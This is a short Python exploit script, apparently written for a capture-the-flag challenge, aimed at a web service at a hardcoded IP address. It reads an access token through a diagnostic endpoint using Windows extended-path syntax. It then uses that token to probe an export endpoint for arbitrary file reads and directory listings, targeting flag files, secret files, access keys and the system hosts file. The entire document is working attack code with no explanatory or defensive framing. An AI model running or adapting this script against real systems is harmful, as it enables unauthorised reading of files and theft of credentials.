import requests

BASE_URL = "http://1.95.51.2:8080"

def get_token():
    try:
        r = requests.get(f"{BASE_URL}/api/diag/read", params={"path": r"\\?\C:\token\access_key.txt"}, timeout=5)
        if r.status_code == 200 and r.json().get("success"):
            return r.json().get("token")
    except:
        pass
    return None

def check(path):
    t = get_token()
    if not t: return
    url = f"{BASE_URL}/api/export/read"
    try:
        r = requests.get(url, params={"path": path, "token": t}, timeout=5)
        print(f"Path: {path} -> {r.status_code}")
        if r.status_code != 404 and r.status_code != 403:
            print(f"RESPONSE: {r.text}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    candidates = [
        "flag.txt",
        "flag",
        "Flag.txt",
        "secret.txt",
        "backup/flag.txt",
        "backup/flag",
        "export/flag.txt",
        "export/flag",
        "token/access_key.txt",
        "Windows/System32/drivers/etc/hosts"
    ]
    
    # Check D:
    for c in candidates:
        check(fr"\\?\D:\{c}")
        
    # Check if D: is actually mapped to C:?
    check(r"\\?\D:\token\access_key.txt")
    
    # Check if C: contains junctions
    check(r"\\?\C:\token\flag.txt")
    check(r"\\?\C:\export\flag.txt")
    
    # Check if we can list
    check(r"\\?\D:")
    check(r"\\?\D:\*")
